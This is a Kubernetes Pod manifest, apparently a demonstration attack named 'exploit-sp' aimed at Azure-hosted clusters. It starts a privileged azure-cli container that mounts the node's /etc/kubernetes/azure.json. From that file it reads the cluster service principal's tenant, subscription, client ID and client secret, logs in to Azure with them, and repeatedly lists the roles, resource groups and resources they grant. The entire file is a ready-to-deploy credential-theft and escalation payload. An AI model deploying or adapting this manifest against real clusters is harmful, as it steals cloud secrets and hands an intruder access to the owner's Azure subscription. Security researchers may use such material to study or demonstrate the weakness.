apiVersion: v1
kind: Pod
metadata:
  name: exploit-sp
spec:
  containers:
    - image: mcr.microsoft.com/azure-cli
      securityContext:
        privileged: true
      name: sp-app
      command: ["/bin/sh", "-c", "--"]
      args: ['while true; echo "retrieving login credentials"; export TENANT_ID=$(cat /host/azure.json | jq -r ".tenantId" ); export SUBSCRIPTION_ID=$(cat /host/azure.json | jq -r ".subscriptionId" ); export CLIENT_ID=$(cat /host/azure.json | jq -r ".aadClientId" ); export CLIENT_SECRET=$(cat /host/azure.json | jq -r ".aadClientSecret" ); az login --service-principal --username $CLIENT_ID --password $CLIENT_SECRET --tenant $TENANT_ID; echo "\nyour credentials have the following roles:"; az role assignment list --subscription $SUBSCRIPTION_ID; echo "\nyour credentials have access to the following resource groups:"; az group list --subscription $SUBSCRIPTION_ID -o table; echo "\nyour credentials have access to the following resources:"; az resource list -o table; do sleep 10; done;']
      volumeMounts:
      - name: host-sp
        mountPath: /host/azure.json
        readOnly: false
  volumes:
    - name: host-sp
      hostPath:
        # this file contains the cluster service-principal, it exists on every node by default
        path: /etc/kubernetes/azure.json
        type: File
